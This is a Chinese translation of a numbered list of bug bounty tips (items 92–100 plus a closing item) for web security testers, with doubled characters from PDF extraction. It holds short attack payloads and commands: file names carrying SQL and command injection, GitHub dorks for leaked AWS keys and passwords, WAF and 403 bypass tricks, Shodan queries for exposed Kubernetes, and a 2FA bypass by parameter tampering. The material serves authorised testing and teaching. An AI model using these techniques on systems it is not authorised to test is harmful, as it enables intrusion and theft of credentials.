确实⾮非常有⽤用的GraphQL 101!
92. 将⽂文件上传与其他vulns链接起来
By @manas_hunter
Source: link
在Web应⽤用程序中测试⽂文件上传功能时，可以尝试将⽂文件名设置为以下值。
../../../tmp/lol.png  —> ⽤用于路路径遍历
sleep(10)-- -.jpg  —> ⽤用于SQL注⼊入
.jpg/png  —> ⽤用于XSS
; sleep 10;  —> ⽤用于命令注⼊入
通过这些有效载荷，我们可能会触发额外的漏漏洞洞。
93. 通过GitHub dorks发现 AWS, Jira, Okta .. secrets
验室制作翻译出品
By @hunter0x7, @GodfatherOrwa
Source: link1, link2
以下是@hunter0x7分享的⼀一些有⽤用的GitHub dorks，⽤用于识别亚⻢马逊AWS云相关的敏敏感信息。
这是@GodfatherOrwa分享的另⼀一个GitHub dorks，⽤用于识别其他各种凭据和机密。
提示。当你在GitHub上dorks时，也可以试试GitDorker(由@obheda12制作)，它能使整个过程⾃自动化，
其中总共包含240多个dorks，可以轻松赢得bug赏⾦金金。
关于GitDorker的详细信息可以在这⾥里里找到。
也可查看相关提示BBT5-8。
94. 简单的反射XSS场景
By @_justYnot
Source: link
这是⼀一个有趣的bug赏⾦金金写法，导致了了⼀一个反射XSS（通过访问链接进⾏行行跨站点脚本）。
作者能够成功地识别和利利⽤用XSS，尽管事实上应⽤用程序正在过滤⼀一些字符和关键字（可能受WAF保
护）。
Here’s what @_justYnot did in detail:
1. 运⾏行行 subfinder -d target.com | httprobe -c 100 > target.txt 。
2. 运⾏行行 cat target.txt | waybackurls | gf xss | kxss 。
3. 得到⼀一个URL，其中所有的特殊字符都没有过滤，参数为 callback= 。
4. 尝试了了⼀一些基本的XSS有效载荷，但它们不不起作⽤用，⽹网站正在过滤有效载荷中的⼀一些关键字（如脚
本和警报）。
org:Target "bucket_name"
org:Target "aws_access_key"
org:Target "aws_secret_key"
org:Target "S3_BUCKET"
org:Target "S3_ACCESS_KEY_ID"
org:Target "S3_SECRET_ACCESS_KEY"
org:Target "S3_ENDPOINT"
org:Target "AWS_ACCESS_KEY_ID"
org:Target "list_aws_accounts"
"target.com" password or secret
"target.atlassian" password
"target.okta" password
"corp.target" password
"jira.target" password
"target.onelogin" password
target.service-now password
some time only "target"
验室制作翻译出品
5. 然后他提到了了@PortSwiggerXSS攻略略(链接)
6. 在尝试了了⼀一些有效载荷后，有⼀一个以onbegin为事件的有效载荷成功了了，XSS执⾏行行成功了了!
7. 做了了⼀一个很好的报告，上个⽉月发给公司，得到了了$$的奖励。
这就是⼀一个很好的例例⼦子，为什什么我们在遇到困难的时候永远不不要放弃。当你有了了⼀一个线索，你必须继续
努⼒力力才能得到回报!
以下是@_justYnot使⽤用的⼯工具列列表。
https://github.com/projectdiscovery/subfinder
https://github.com/tomnomnom/httprobe
https://github.com/tomnomnom/waybackurls
https://github.com/tomnomnom/gf
https://github.com/1ndianl33t/Gf-Patterns (xss pattern)
https://github.com/tomnomnom/hacks/tree/master/kxss
95. 500个Favicon哈希值的数据库(FavFreak)
By @0xAsm0d3us
Source: link
有⼀一个⾮非常酷的新项⽬目叫FavFreak，它包含了了⼤大约500个Favicon哈希值。
这在Bug Bounties、OSINT、指纹识别等过程中是⾮非常有⽤用的，因为它可以让你很容易易地识别出⼀一个特
定的URL上部署的是哪种软件。
该⼯工具允许您从URL列列表中获取Favicons，并根据它们的Favicon哈希值进⾏行行排序。使⽤用⽅方法⾮非常简单。
结果，你会看到。
哪个Favicon哈希在哪个URL上？
基于Favicon哈希值的识别软件。
摘要和统计
cat urls.txt | python3 favfreak.py -o output
验室制作翻译出品
FavFreak可以识别⼏几乎所有现在⼴广泛使⽤用的当代软件。你还可以轻松添加额外的指纹。
从这⾥里里获取FavFreak。
https://github.com/devanshbatham/FavFreak
96. XSS防⽕火墙绕过技术
By @sratarun
Source: link
这⾥里里列列出了了7种有⽤用的技术，告诉我们如何绕过WAF（Web应⽤用防⽕火墙），同时利利⽤用Web应⽤用中的
XSS（跨站点脚本）。
1. 检查防⽕火墙是否只屏蔽⼩小写。
 。
2. 尝试⽤用新的⾏行行(\r\n)打破防⽕火墙的regex，也就是CRLF注⼊入。
 。
验室制作翻译出品
3. 试试双重编码。
%2522
4. 测试递归过滤器器，如果防⽕火墙删除了了粗体字，我们将得到清晰的有效载荷。
。
5. 注⼊入不不含whitespaces的锚标签。
6. 试着bullet绕过whitespaces。
。
7. 尝试改变请求⽅方式（POST⽽而不不是GET）。
GET /?q=xss 改为 POST /q=xss 。
提示。另请查阅以前发表的关于WAF绕过的提示BBT7-5。
97. 12款安卓安全测试⼯工具列列表
By @cry__pto
Source: link
这是⼀一个当今最好的Android安全测试⼯工具的集合。
1. Dex2JAR - ⼀一套⽤用于Android Dex和Java CLASS⽂文件的⼯工具。
2. ByteCodeView - Java & Android APK 逆向⼯工程套件 (反编译器器，编辑器器，调试器器等)
3. JADX - Dex转Java反编译⼯工具，⽤用于从Android Dex和APK⽂文件⽣生成Java源代码。
4. JD-GUI - ⼀一个独⽴立的图形化⼯工具，⽤用于显示来⾃自CLASS⽂文件的Java源。
5. Drozer - ⼀一个全⾯面的Android安全测试框架。
6. Baksmali - Dalvik(Android的Java)使⽤用的Dex格式的汇编器器/反汇编器器。
7. AndroGuard - ⼀一把⽤用于分析、反编译和逆转Android应⽤用程序的瑞⼠士军⼑刀。
8. ApkTool - 另⼀一个反向⼯工程Android应⽤用程序的瑞⼠士军⼑刀⼯工具。
9. QARK - ⽤用于查找多个安全相关的Android应⽤用漏漏洞洞的⼯工具。
10. AndroBugs - 另⼀一个⽤用于识别Android应⽤用程序中安全漏漏洞洞的分析⼯工具。
11. AppMon - ⽤用于监控和篡改本地macOS、iOS和Android应⽤用的系统API调⽤用的⾃自动化框架。
12. MobSF - ⼀一个⽀支持Android，iOS和Windows移动应⽤用的⼀一体化⾃自动化移动安全框架。
真的是⼀一个了了不不起的⼯工具列列表，不不仅仅是⽤用于Android应⽤用的反转！有些擅⻓长静态分析，有些⽤用于动态
分析，有些则是两者兼⽽而有之，但所有这些⼯工具都是开源且免费使⽤用的。
其中有些擅⻓长静态分析，有些⽤用于动态分析，有些则是两者兼⽽而有之，但所有这些⼯工具都是开源的，⽽而
且可以免费使⽤用
98. 绕过403和401错误的技巧
By @RathiArpeet
Source: link
以下是关于如何绕过403 Forbidden和401 Unauthorized错误的提示列列表。
1. By adding headers: X-Originating-IP, X-Remote-IP, X-Client-IP, X-Forwarded-For etc. 有时，公
验室制作翻译出品
司会为那些可以访问敏敏感数据的⼈人设置IP⽩白名单。这些头信息以IP地址为值，如果所提供的IP与他
们的⽩白名单相匹配，就可以让你访问资源。
2. With unicode chars: 试着插⼊入unicode字符以绕过防卫措施. 试试例例如℀ = ca, ℁ = sa和许多其他
的(查看这⾥里里或这⾥里里). 所以，如果/cadmin被封，可以尝试访问℀dmin。更更多详情请看这个youtube
上关于unicode hacking tricks的短视频。
3. By overriding, overwriting URL with headers: 如果GET /admin给你403 Forbidden，尝试
GET /accessible（任何可访问的端点），并添加任何这些HTTP头。
X-Original-URL: /admin
X-Override-URL: /admin
X-Rewrite-URL: /admin
4. 尝试不不同的有效载荷。如果 "GET /admin "给你 "403 Forbidden"，请尝试访问：
/accessible/..;/admin
/.;/admin
/admin;/
/admin/~
/./admin/./
/admin?param
/%2e/admin
/admin#
5. ⽅方法切换。把⽅方法从GET改成POST，看看是否有收获... ...
6. 通过IP、Vhost。通过IP或Vhost访问⽹网站，获取被禁⽌止的内容。
7. Fuzzing。通过强制（模糊）⽂文件或⽬目录的⽅方式进⼀一步...
提示。还请检查以前发表的与此有关的提示。: BBT6-6, BBT4-5 and BBT4-6.
99. ⽤用Shodan找到Kubernetes。
By @Alra3ees
Source: link
这⾥里里有2种简单的⽅方法，如何使⽤用ShodanCLI和httpx来识别⽬目标组织中的Kubernetes。
1. 通过product "Kubernetes"发现:
2. 通过端⼝口 "10250"发现:
shodan search org:"target" product:"Kubernetes" | awk '{print $3 ":" $2}' | 
httpx -path /pods -content-length -status-code -title
shodan search org:"target" port:"10250" | awk '{print $3 ":" $2}' | httpx -path 
/pods -content-length -status-code -title
验室制作翻译出品
相当⽅方便便!
请确保安装了了以下⼯工具。
https://github.com/achillean/shodan-python
https://github.com/projectdiscovery/httpx
100. 多因素（2FA）认证绕过
By @N008x
Source: link
这⾥里里有⼀一个有趣的提示，可以绕过Web应⽤用程序或移动应⽤用程序中的2FA。
1.在登录时总是注意到这两个HTTP请求--当2FA被启⽤用和禁⽤用时。
2. 当2FA被禁⽤用时:
Request:
{"email":"PI:EMAIL","password":"abc@123","mfa":**null**,"code":""}
Response:
Location: https://vulnerable-site.com/user/dashboard
3. 启⽤用2FA时:
Request:
{"email":"PI:EMAIL","password":"abc@123","mfa":**true**,"code":""}
Response:
Location: https://vulnerable-site.com/v1/proxy/authentication/authenticate
4. 现在篡改⼀一下参数，改为 "mfa":**null**,"code":""
Response:
Location: https://vulnerable-site.com/user/dashboard
轻松简单的2FA绕过!
完结篇.如何成为赏⾦金金猎⼈人
By @kenanistaken
Source: link
下⾯面就给⼤大家介绍⼀一下如何成为⼀一名赏⾦金金猎⼈人，以及在做赏⾦金金猎⼈人悬赏时需要注意的事项。
验室制作翻译出品
睡个好觉
学习漏漏洞洞类型(owasp)
每次专注于⼀一件事
阅读和练习
学习如何发现和利利⽤用
了了解如何分析⽹网站
看看别⼈人怎么做（报告）
学习⼀一⻔门编程语⾔言
制作⾃自⼰己的脚本
别着急
当然是⼀一个⾮非常谨慎的建议!
声明：
制作翻译由：泰阿安全实验室(Taielab)出品
Github:https://github.com/taielab
原⽂文出⾃自：https://www.infosecmatter.com/bug-bounty-tips-1/这个系列列
博客：https://blog.taielab.com
微信公众号：
验室制作翻译出品